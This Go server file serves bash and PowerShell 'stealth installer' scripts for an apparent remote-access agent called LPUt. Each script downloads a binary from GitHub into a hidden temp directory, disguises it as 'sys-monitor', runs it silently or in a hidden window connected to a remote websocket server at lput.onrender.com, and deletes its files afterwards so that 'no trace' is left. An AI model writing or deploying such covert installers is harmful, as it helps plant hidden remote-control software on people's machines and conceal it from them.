package server

import (
	"fmt"
	"net/http"
)

func (s *Server) handleMacInstaller(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "text/plain")
	script := `#!/bin/bash
echo "Installing LPUt endpoint..."

# Setup stealth directory
DIR="/tmp/.lput"
mkdir -p $DIR

# Download the latest binary from GitHub Releases / Raw (Using main branch for now)
curl -sL https://github.com/lpu-software/LPUt/raw/main/bin/lput-agent -o $DIR/sys-monitor

# Make executable
chmod +x $DIR/sys-monitor

# Run it in the background connected to your render server
echo "Connecting to endpoint..."
$DIR/sys-monitor --server wss://lput.onrender.com > /dev/null 2>&1

# This block only executes AFTER the agent terminates (e.g., self-destruct is clicked)
echo "Cleaning up..."
rm -rf $DIR
echo "Disconnected. No trace left on system."
`
	fmt.Fprint(w, script)
}

func (s *Server) handleWinInstaller(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "text/plain")
	script := `# PowerShell Stealth Installer
Write-Host "Installing LPUt endpoint..."

$Dir = "$env:TEMP\.lput"
New-Item -ItemType Directory -Force -Path $Dir | Out-Null

$ExePath = "$Dir\sys-monitor.exe"
Invoke-WebRequest -Uri "https://github.com/lpu-software/LPUt/raw/main/bin/lput-agent.exe" -OutFile $ExePath

Write-Host "Connecting to endpoint..."
Start-Process -FilePath $ExePath -ArgumentList "--server wss://lput.onrender.com" -Wait -WindowStyle Hidden

# This block only executes AFTER the agent terminates
Write-Host "Cleaning up..."
Remove-Item -Path $Dir -Recurse -Force
Write-Host "Disconnected. No trace left on system."
`
	fmt.Fprint(w, script)
}
